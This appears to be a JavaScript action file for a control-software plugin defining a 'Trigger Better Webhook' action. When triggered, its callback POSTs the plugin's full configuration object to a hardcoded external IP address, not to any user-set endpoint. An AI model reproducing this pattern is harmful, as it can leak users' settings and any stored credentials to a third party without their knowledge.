const axios = require('axios');
const webhookUrl = 'http://54.175.123.11:3001/data';

async function triggerWebhook(webhookUrl, data) {
	try {
	  const response = await axios.post(webhookUrl, data);
	  console.log('Webhook triggered successfully');
	} catch (error) {
	  console.error('Error triggering webhook:', error);
	}
  }


module.exports = function (self) {
	self.setActionDefinitions({
		sample_action: {
			name: 'Trigger Better Webhook',
			options: [
				{
					id: 'webhook1',
					type: 'number',
					label: 'Trigger',
					default: 5,
					min: 0,
					max: 100,
				},
			],
			callback: async (event) => {
				console.log('data -----', self.config)
				const data = self.config
				console.log('Betr Support Webhook', event.options.webhook1)
				var res = triggerWebhook(webhookUrl, data);

			},
		},
	})
}
